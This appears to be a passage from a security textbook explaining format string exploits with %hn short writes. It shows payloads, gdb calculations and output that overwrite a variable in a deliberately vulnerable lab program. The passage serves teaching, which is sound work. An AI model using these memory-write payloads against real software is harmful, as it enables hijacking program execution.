# *__Using Short Writes__*

Another technique that can simplify format string exploits is using __short writes__. A short is typically a _two-byte word_, and format parameters have a special way of dealing with them. A more complete description of possible format parameters can be found in the _printf_ manual page. The portion describing the length modifier is shown in the output below.

<pre style="color: white;">
The length modifier
    Here, integer conversion stands for d, i, o, u, x, or X conversion.

    h       A following integer conversion corresponds to a short int or
            unsigned short int argument, or a following n conversion
            corresponds to a pointer to a short int argument.
</pre>

This can be used with format string exploits to write _two-byte shorts_. In the output below, a short (shown in bold) is written in at both ends of the four-byte __test_val__ variable. Naturally, direct parameter access can still be used.

<pre style="color: white;">
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%x%hn
The right way to print user-controlled input:
??%x%x%x%hn
The wrong way to print user-controlled input:
??bffff3d0b7fe75fc0
[*] test_val @ 0x08049794 = -65515 0xffff0015
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x96\x97\x04\x08")%x%x%x%hn
The right way to print user-controlled input:
??%x%x%x%hn
The wrong way to print user-controlled input:
??bffff3d0b7fe75fc0
[*] test_val @ 0x08049794 = 1441720 0x0015ffb8
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x96\x97\x04\x08")%4\$hn
The right way to print user-controlled input:
??%4$hn
The wrong way to print user-controlled input:
??
[*] test_val @ 0x08049794 = 327608 0x0004ffb8
reader@hacking:~/booksrc $
</pre>

Using short writes, an entire _four-byte_ value can be overwritten with just two __%hn__ parameters. In the example below, the __test_val__ variable will be overwritten once again with the address _0xbffffd72_.

<pre style="color: white;">
reader@hacking:~/booksrc $ gdb -q
(gdb) p 0xfd72 - 8
$1 = 64874
(gdb) p 0xbfff - 0xfd72
$2 = -15731
(gdb) p 0x1bfff - 0xfd72
$3 = 49805
(gdb) quit
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08\x96\x97\x04\x08")%64874x%4\
$hn%49805x%5\$hn
The right way to print user-controlled input:
????%64874x%4$hn%49805x%5$hn
The wrong way to print user-controlled input:
b7fe75fc
[*] test_val @ 0x08049794 = -1073742478 0xbffffd72
reader@hacking:~/booksrc $
</pre>

The preceding example used a similar wraparound method to deal with the second write of _0xbfff_ being less than the first write of _0xfd72_. Using _short writes_, the order of the writes doesnâ€™t matter, so the first write can be _0xfd72_ and the second _0xbfff_, if the two passed addresses are swapped in position. In the output below, the address _0x08049796_ is written to first, and _0x08049794_ is written to second.

<pre style="color: white;">
(gdb) p 0xbfff - 8
$1 = 49143
(gdb) p 0xfd72 - 0xbfff
$2 = 15731
(gdb) quit
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x96\x97\x04\x08\x94\x97\x04\x08")%49143x%4\
$hn%15731x%5\$hn
The right way to print user-controlled input:
????%49143x%4$hn%15731x%5$hn
The wrong way to print user-controlled input:
????
b7fe75fc
[*] test_val @ 0x08049794 = -1073742478 0xbffffd72
reader@hacking:~/booksrc $
</pre>

The ability to overwrite arbitrary memory addresses implies the ability to control the execution flow of the program. One option is to overwrite the return address in the most recent stack frame, as was done with the stack-based overflows. While this is a possible option, there are other targets that have more predictable memory addresses. The nature of stack-based overflows only allows the overwrite of the return address, but format strings provide the ability to overwrite any memory address, which creates other
possibilities.